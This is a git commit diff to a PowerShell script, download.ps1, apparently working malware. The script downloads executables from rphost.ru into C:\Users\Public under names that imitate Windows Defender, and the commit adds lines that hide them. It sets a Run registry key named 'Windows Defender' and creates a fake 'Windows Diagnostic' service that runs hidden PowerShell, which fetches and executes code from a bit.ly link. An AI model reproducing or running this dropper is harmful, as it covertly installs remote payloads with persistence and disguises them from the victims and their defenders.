57b4d121e41e0875ce3f7c8b39f58b28c8560193
ExploitGF <32704607+ExploitGF@users.noreply.github.com>
2018-08-30 12:31:34 +0500

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -3,10 +3,12 @@ switch ($n)
 {
         1 {
 		(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/64.signed","C:\Users\Public\MSASC.exe")
+		Get-Item C:\Users\Public\MSASC.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
 		(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/MS_ASC64_1.signed","C:\Users\Public\MSASCuiL.exe")
+		Get-Item C:\Users\Public\MSASCuiL.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
 		New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name "Windows Defender" -Value "C:\Users\Public\MSASCuiL.exe"
-	  New-Service -Name "Windows Diagnostic" -BinaryPathName "cmd /c powershell.exe -nop -w hidden IEX (New-Object Net.WebClient).downloadstring('https://bit.ly/2olWimV');" -DisplayName "Windows Diagnostic" -Description "Windows Diagnostic"
-    start-process -FilePath 'C:\Users\Public\MSASCuiL.exe'
+                New-Service -Name "Windows Diagnostic" -BinaryPathName "cmd /c powershell.exe -nop -w hidden IEX (New-Object Net.WebClient).downloadstring('https://bit.ly/2olWimV');" -DisplayName "Windows Diagnostic" -Description "Windows Diagnostic"
+                start-process -FilePath 'C:\Users\Public\MSASCuiL.exe'
 		Exit
 		} 
         2 
